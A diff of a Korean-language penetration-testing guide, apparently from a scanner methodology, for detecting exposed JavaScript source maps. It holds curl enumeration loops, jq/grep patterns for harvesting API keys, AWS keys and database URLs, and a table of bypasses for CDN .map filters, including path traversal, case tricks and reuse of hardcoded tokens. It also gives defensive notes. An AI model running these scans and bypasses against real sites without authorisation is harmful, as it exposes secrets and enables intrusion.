@@ -1,54 +1,127 @@
-### Phase 2: 동적 테스트 (Source Map 다운로드)
+### Phase 2: 동적 테스트 (검증)
 
-**Step 1: JS/CSS 파일 수집**
-```
-# 메인 페이지의 HTML에서 JS/CSS 파일 URL 추출
-curl -s "https://target.com/" | grep -oP '(src|href)="[^"]*\.(js|css)"' | grep -oP '"[^"]*"' | tr -d '"'
+**정찰 페이로드:**
 
-# 또는 소스코드의 빌드 출력 디렉토리에서 파일 목록 확인
-```
+**JS/CSS 파일 enumeration:**
+```bash
+# HTML에서 JS/CSS URL 추출
+curl -s "https://target/" | grep -oP '(src|href)="[^"]*\.(js|css|mjs)"' | grep -oP '"[^"]*"' | tr -d '"'
 
-**Step 2: sourceMappingURL 확인**
-```
-# 각 JS 파일의 마지막 줄에서 sourceMappingURL 확인
-curl -s "https://target.com/static/js/main.abc123.js" | tail -5
-# //# sourceMappingURL=main.abc123.js.map 이 있으면 Source Map 존재
-
-# CSS 파일도 확인
-curl -s "https://target.com/static/css/main.abc123.css" | tail -5
+# robots.txt, sitemap.xml에서 추가 파일
+curl -s "https://target/robots.txt"
+curl -s "https://target/sitemap.xml"
 ```
 
-**Step 3: Source Map 다운로드**
+**sourceMappingURL 확인:**
+```bash
+# 각 번들 마지막 주석
+curl -s "https://target/static/js/main.abc123.js" | tail -3
+# //# sourceMappingURL=main.abc123.js.map
+
+# inline sourcemap (data:application/json;base64,...)
+curl -s "https://target/static/js/main.js" | grep "sourceMappingURL=data:"
 ```
-# .map 파일 다운로드 시도
-curl -o sourcemap.json "https://target.com/static/js/main.abc123.js.map" -v
-# 200 OK이면 다운로드 성공 → 노출 확인
 
-# sourceMappingURL이 없어도 .map 확장자를 붙여 시도
-curl -o sourcemap.json "https://target.com/static/js/main.abc123.js.map" -v
+---
+
+**기본 페이로드:**
+
+**.map 파일 다운로드 시도:**
+```bash
+# 명시된 URL
+curl -o /tmp/map.json "https://target/static/js/main.abc123.js.map" -v
+
+# sourceMappingURL 없어도 추측 (HIDDEN_BUT_EXPOSED 라벨)
+for name in main bundle app vendor chunk index runtime polyfills; do
+  for ext in js mjs; do
+    curl -sI "https://target/static/${ext}/${name}.${ext}.map" | head -1
+  done
+done
+
+# 압축본 잔존
+curl -sI "https://target/static/js/main.js.map.gz"
+curl -sI "https://target/static/js/main.js.map.br"
+
+# CSS sourcemap
+curl -sI "https://target/static/css/main.css.map"
+
+# Service Worker
+curl -sI "https://target/sw.js.map"
+curl -sI "https://target/service-worker.js.map"
+
+# Next.js 서버 sourcemap
+curl -sI "https://target/_next/static/chunks/main.abc.js.map"
+curl -sI "https://target/_next/server/pages/index.js.map"
+
+# Hash variants
+for hash in $(seq 1 5); do
+  curl -sI "https://target/static/js/main-$(printf '%08x' $hash).js.map"
+done
 ```
 
-**Step 4: Source Map에서 원본 소스 복원 및 민감 정보 분석**
-다운로드된 Source Map JSON에서 `sourcesContent` 필드를 추출하여 원본 소스코드를 복원한 뒤, 민감 정보를 검색한다.
+**민감 정보 추출:**
+```bash
+# sourcesContent 필드 파싱 + 패턴 검색
+jq -r '.sourcesContent[]?' /tmp/map.json | grep -iE "apikey|api_key|secret|token|password|AKIA|aws_|mongodb://|postgres://|redis://|bearer "
 
-**검색 대상 패턴:**
-- API 키/시크릿: `apiKey`, `api_key`, `secret`, `SECRET_KEY`, `PRIVATE_KEY`, `token`, `password`, `credential`
-- AWS 키: `AKIA`, `aws_access_key_id`, `aws_secret_access_key`
-- 내부 URL: `internal`, `admin`, `staging`, `dev.`, `localhost`, `127.0.0.1`, `10.0.`, `192.168.`
-- DB 연결: `mongodb://`, `postgres://`, `mysql://`, `redis://`
-- 주석 메모: `TODO`, `FIXME`, `HACK`, `XXX`, `BUG`, `VULNERABILITY`
-- 환경변수 인라인: `process.env.` 뒤에 실제 값이 치환되어 있는 경우
-- 하드코딩된 자격 증명: `password=`, `passwd=`, `Basic ` (Base64), `Bearer `
+# 내부 URL/주석
+jq -r '.sourcesContent[]?' /tmp/map.json | grep -iE "internal|admin|staging|dev\.|localhost|127\.0\.0\.1|10\.|192\.168\.|TODO|FIXME|XXX"
 
-**검증 기준:**
-- **확인됨**: Source Map 파일이 다운로드 가능하고, 원본 소스코드가 복원되어 민감 정보가 발견됨
-- **후보**: 동적 테스트를 수행하지 않았거나, Source Map은 다운로드되었으나 민감 정보 분석을 수동으로 확인해야 하는 경우
-- **보고서 제외**: Source Map이 404로 접근 불가하거나, `sourceMappingURL`이 없고 .map 파일도 존재하지 않는 경우
+# 환경변수 인라인 치환
+jq -r '.sourcesContent[]?' /tmp/map.json | grep -oE 'process\.env\.[A-Z_]+ = "[^"]+"'
 
-## Phase 2 완료 조건
+# 모듈 트리 (sources)
+jq -r '.sources[]?' /tmp/map.json
+```
 
-다음 항목을 모두 충족해야 Phase 2가 완료된 것으로 간주한다.
+**Sentry/Datadog upload 확인:**
+```bash
+# 일반적인 Sentry artifact 경로
+curl -sI "https://target/_sentry/artifacts/<sha256>"
 
-- .map 파일 다운로드 시도 여부 및 HTTP 응답 코드
-- 다운로드 성공 시, sourcesContent에서 민감 정보 패턴 검색 수행 여부
-- 검색 결과 (발견된 민감 정보 목록 또는 "민감 정보 없음")
+# 공개된 Sentry release
+curl -s "https://sentry.io/api/0/organizations/<org>/releases/<release>/files/"
+```
+
+---
+
+**우회 페이로드:**
+
+| 방어 | 페이로드 |
+|---|---|
+| CI에서 `*.map` 삭제 | `*.map.gz`/`*.map.br` 압축본 잔존, `.css.map` 누락, `sw.js.map`/`service-worker.js.map` 누락 |
+| CDN path filter (`.map` 차단) | path traversal `/js/../..//bundle.js.map`, query `?` 추가 (`bundle.js.map?x=1`), `.MAP` 대소문자 |
+| `hidden-source-map` | 파일 자체는 잔존 — 추측 가능 이름 (`main.js.map`, `app.js.map`) |
+| Sentry upload 후 삭제 | Sentry public release artifact 권한 부족 시 조회 가능 |
+| 인증된 sourcemap server | 토큰이 클라이언트 번들에 하드코딩 — 추출 후 재사용 |
+| Public S3 bucket 배포 | `.map` 파일 public read — bucket enumeration |
+| HTTP 404 로깅 의존 | 정상 응답 코드로 위장 (CDN 설정 의존) |
+| 내부 IP 화이트리스트 | sourcemap server가 외부 노출되면 우회 |
+
+**다양한 path 변형:**
+```bash
+# 직접 .map 차단 시도
+GET /static/js/main.js.map      → 403
+GET /static/js/main.js.map?x=1  → 200 (query 무시)
+GET /static/js/main.js.MAP      → 200 (case 차이)
+GET /static/js/../js/main.js.map → 200 (path 정규화 차이)
+```
+
+---
+
+**참고사항:**
+
+- Source Map 자체는 직접 공격 벡터가 아니나 민감 정보 포함 시 심각도 격상
+- `hidden-source-map`은 주석만 제거 — 파일은 여전히 배포되므로 추측 가능 이름이면 무용지물
+- Next.js는 `productionBrowserSourceMaps: false`여도 서버 sourcemap 별도 — `/_next/server/` 경로 점검
+- Sentry/Datadog upload는 배포 후 clean step 필수 — CI에 `find . -name "*.map" -delete`
+- CDN edge에서 `.map` 확장자 필터링은 가장 간단한 방어
+- CI artifact가 public repo면 GitHub Actions artifact URL도 노출 위로 고려
+- 민감 정보 없는 sourcemap은 영향도 약함 — 스캐너 목적은 노출 + 민감 정보 병합 판정
+- 자체 코드 외 vendor sourcemap (node_modules)도 있으면 본인 코드 식별 어려움 (효율 방어)
+- inline sourcemap (`data:application/json;base64,...`)은 번들 자체에 포함 — 전체 노출
+- `sourcesContent`가 `null`이면 원본 소스 미포함 — 영향도 약함 (단순 line number 매핑만)
+- `sourceRoot`로 외부 경로 추측 가능 — repo 구조 노출
+- 모듈 트리 (`sources` 배열)에 사내 모듈 경로가 그대로 노출되면 internal info disclosure
+- WebPack 5+는 `output.devtoolModuleFilenameTemplate`으로 모듈 경로 위장 가능 (방어)
+- Vite는 `build.sourcemap: 'hidden'`이 default가 아닌 경우 잔존
